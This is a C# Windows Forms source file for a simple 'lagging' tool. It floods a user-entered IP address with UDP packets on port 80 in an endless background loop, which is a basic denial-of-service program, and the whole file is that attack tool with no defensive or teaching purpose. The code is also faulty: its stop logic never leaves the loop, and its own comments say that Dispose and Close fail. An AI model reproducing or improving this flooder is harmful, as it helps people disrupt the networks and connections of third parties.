using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.IO;
using System.Net.Sockets;

namespace LPLS_2
{
 public partial class MainForm : Form
 {
  public MainForm()
  {
   InitializeComponent();
  }

  private void button1_Click(object sender, EventArgs e)
  {
   if (string.IsNullOrEmpty(textBox1.Text)) /* For the person who clicks before typing, such shame. */
   {
    MessageBox.Show("Please specify the IP address in the form. (NO PORT)");
   }
   else
   {
    if (button1.Text == "Start")
    {
     if (backgroundWorker1.IsBusy == true) {
     // backgroundWorker1.CancelAsync();
     backgroundWorker1.Dispose(); /* This does not work. */
     }
     else
     backgroundWorker1.RunWorkerAsync();
     backgroundWorker1.WorkerSupportsCancellation = true;
     button1.Text = "Stop";
     textBox1.Enabled = false;
     toolStripLabel1.Text = "Lagging is in progress.";
    }
    else if (button1.Text == "Stop")
    {
     textBox1.Enabled = true;
     toolStripLabel1.Text = "Lagging is stopped.";
     button1.Text = "Start";
     backgroundWorker1.CancelAsync();
    }
   }
  }

  private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
  {
   byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes("<Packet>");
   string IP = textBox1.Text;
   int PORT = 80; /* Create a textBox2 to make this dependant on user input. (See above). */
   IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), PORT);
   Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
   while (true) /* Loop. */
    if (backgroundWorker1.CancellationPending == true)
    {
     client.Shutdown(SocketShutdown.Both);
     // client.Close(); /* This causes a disposed object, you cannot access a disposed object. */
    }
    else
   {
    client.SendTo(packetData, ep);
   }
  }
 }
}